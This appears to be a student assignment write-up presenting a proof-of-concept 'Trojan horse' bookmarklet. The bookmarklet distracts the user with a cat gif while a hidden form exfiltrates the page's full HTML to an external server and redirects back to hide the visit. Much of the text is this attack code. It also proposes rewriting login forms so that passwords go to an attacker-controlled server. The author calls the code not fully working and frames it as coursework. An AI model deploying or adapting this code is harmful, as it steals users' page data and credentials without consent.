# Assignment 2: Bookmarklet
Make a bookmarklet that works against the user.

I wanted to try creating a proof of concept for a malicious bookmarklet, that gathers up the data on the page and sends is to an external server.  I'll package it up with a cute distraction, to make it a very simple variation on the classic Trojan Horse (inspired by [Bonzi Buddy](http://malware.wikia.com/wiki/BonziBUDDY)) 

So our bookmarklet can start out by adding a cute cat gif to the page, "improving" the browsing experience.

The simplest way to do this would be

    $.post(externalUrl, $('body').html,
	     function(data){
		     alert("im in ur webnets, stealin ur data");
     });
But we'll quickly run into complications related to CORS which we can't easily solve.

Instead, I tried using a more traditional HTML form that POSTS to an external URL.

    $('body').append("<form id='evil' action='"+url+"' method='post'>
    <input name='bodyHtml' type='hidden' value='"+bodyHtml+"'>
    <input name='redirectUrl' type='hidden' value='testurl'>
    <input type='submit'>
    </form>");
The submit button is not really necessary but is useful for debugging.

This creates an HTML form with the current page's contents as a hidden input field. It also puts the current URL as one of the fields, so our malicious server knows where to send the user back to after ingesting the stolen data, so that the user may not even notice that they've left their intended page, visited a malicious server, and gone back to where they started. Because we're using a traditional HTML form, we will need to actually leave the current page when we POST the data. But we can cover that up easy enough...

After a delay, we can then submit the form

    $('#evil').submit();

 
This is not entirely functional yet, I think I am running into trouble with escaping quote characters when setting the form input to the bodyHtml. Need to play around with some regex to do this better.

       function injectJquery(callback) {
      if (window.jQuery) {
        return callback(window.jQuery);
      }
      let script = document.createElement('script');
      script.setAttribute(
        'src',
        '//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js'
      );
      script.onload = () => callback(window.jQuery);
      script.onerror = e => alert('The script failed to load: ' + e);
      document.head.appendChild(script);
    }
    
    var catGifs = ['http://www.catgifpage.com/gifs/325.gif','https://media.tenor.com/images/47b81948be5023555549c01d88ae3289/tenor.gif','https://memesbams.com/wp-content/uploads/2017/11/Hilarious-Cat-Gifs.gif']
    
    injectJquery(function($) {
      var catGif = catGifs[Math.floor(Math.random()*catGifs.length)];
      $('body').prepend("<img src='"+catGif+"'>");
      
      var url = "http://calebcalebcaleb.com/playback.php";
      // A good old fashioned Trojan Horse
      //Activating this bookmarklet will add a cute cat gif to the page. 
      //It will also exfiltrate the contents of the current page and send it to an external server.
      var bodyHtml = encodeURIComponent($('body').html());
      
      $('body').append("<form id='evil' action='"+url+"' method='POST'><input name='bodyHtml' type='hidden' value='"+bodyHtml+"'><input name='redirectUrl' type='hidden' value='"+url+"'><input type='submit'></form>");
      
    
      
      
    });


  
An alternative solution, similarly malicious but perhaps more elegant, would be to search for existing forms on the page (like a login form) and change its destination URL to a server I control. This would be less obtrusive/detectable for the user, and possibly be more efficient at swiping useful data (like passwords).

But I don't want to get too into making malicious software... the world doesn't need any more of that!
